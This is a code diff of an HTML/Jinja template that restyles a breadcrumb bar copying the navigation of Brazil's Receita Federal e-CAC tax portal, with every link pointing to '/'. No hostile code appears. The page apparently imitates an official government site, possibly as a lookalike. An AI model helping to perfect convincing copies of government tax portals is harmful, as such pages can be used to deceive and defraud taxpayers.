@@ -225,22 +225,22 @@
     <div id="main-page" class="main-page">
         {% include 'rfb_header.html' %}
         
-        <div class="px-4" style="background:#fff;">
-            <div class="max-w-2xl mx-auto py-3">
-                <nav style="display:flex;align-items:center;gap:6px;font-size:12px;font-family:'Inter','Rawline',sans-serif;white-space:nowrap;overflow-x:auto;scrollbar-width:none;">
-                    <a href="/" style="color:#1351B4;"><i class="fas fa-home" style="font-size:12px;"></i></a>
-                    <span style="color:#9E9D9D;font-size:10px;">&gt;</span>
-                    <a href="/" style="color:#1351B4;text-decoration:none;">Ministério da Fazenda</a>
-                    <span style="color:#9E9D9D;font-size:10px;">&gt;</span>
-                    <a href="/" style="color:#1351B4;text-decoration:none;">Receita Federal do Brasil</a>
-                    <span style="color:#9E9D9D;font-size:10px;">&gt;</span>
-                    <a href="/" style="color:#1351B4;text-decoration:none;">e-CAC</a>
-                    <span style="color:#9E9D9D;font-size:10px;">&gt;</span>
-                    <span style="color:#555d68;">Situação Fiscal 2026</span>
+        <div class="gov-breadcrumb-bar">
+            <div class="gov-breadcrumb-inner">
+                <nav>
+                    <a href="/" class="breadcrumb-home"><i class="fas fa-home"></i></a>
+                    <i class="fas fa-chevron-right breadcrumb-sep"></i>
+                    <a href="/">Ministério da Fazenda</a>
+                    <i class="fas fa-chevron-right breadcrumb-sep"></i>
+                    <a href="/">Receita Federal do Brasil</a>
+                    <i class="fas fa-chevron-right breadcrumb-sep"></i>
+                    <a href="/">e-CAC</a>
+                    <i class="fas fa-chevron-right breadcrumb-sep"></i>
+                    <span class="breadcrumb-current">Situação Fiscal 2026</span>
                 </nav>
             </div>
         </div>
-        <hr style="border:none;border-top:1px solid #e1e5eb;margin:0;">
+        <hr class="gov-breadcrumb-divider">
 
         <div class="px-4 py-4">
             <div class="max-w-2xl mx-auto">
